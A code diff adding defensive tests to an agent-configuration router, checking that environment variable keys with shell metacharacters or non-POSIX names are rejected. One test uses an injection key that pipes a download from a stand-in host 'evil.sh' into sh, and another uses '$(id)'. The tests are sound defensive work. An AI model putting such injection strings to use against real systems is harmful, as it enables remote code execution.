@@ -160,6 +160,62 @@ describe("agentConfigsRouter", () => {
 			expect(created.env).toEqual({ FOO: "bar" });
 		});
 
+		it("rejects env keys containing shell metacharacters (RCE guard)", async () => {
+			const caller = createCaller();
+			await caller.list();
+
+			// A key like this would inject a command if interpolated unquoted into
+			// a PTY launch prefix (`KEY=value ...`).
+			await expect(
+				caller.add({
+					label: "Evil",
+					command: "echo",
+					args: [],
+					promptTransport: "argv",
+					promptArgs: [],
+					env: { "FOO;curl$IFS-sSf$IFSevil.sh|sh;X": "1" },
+				}),
+			).rejects.toThrow();
+		});
+
+		it("rejects env keys that are not valid POSIX identifiers", async () => {
+			const caller = createCaller();
+			await caller.list();
+
+			for (const badKey of ["9FOO", "FOO BAR", "FOO-BAR", "$(id)", ""]) {
+				await expect(
+					caller.add({
+						label: "Bad",
+						command: "echo",
+						args: [],
+						promptTransport: "argv",
+						promptArgs: [],
+						env: { [badKey]: "1" },
+					}),
+				).rejects.toThrow();
+			}
+		});
+
+		it("accepts valid POSIX env identifiers", async () => {
+			const caller = createCaller();
+			await caller.list();
+
+			const created = await caller.add({
+				label: "Good",
+				command: "echo",
+				args: [],
+				promptTransport: "argv",
+				promptArgs: [],
+				env: { FOO_BAR: "1", _UNDERSCORE: "2", API_KEY2: "3" },
+			});
+
+			expect(created.env).toEqual({
+				FOO_BAR: "1",
+				_UNDERSCORE: "2",
+				API_KEY2: "3",
+			});
+		});
+
 		it("preserves an arbitrary presetId tag verbatim", async () => {
 			const caller = createCaller();
 			await caller.list();
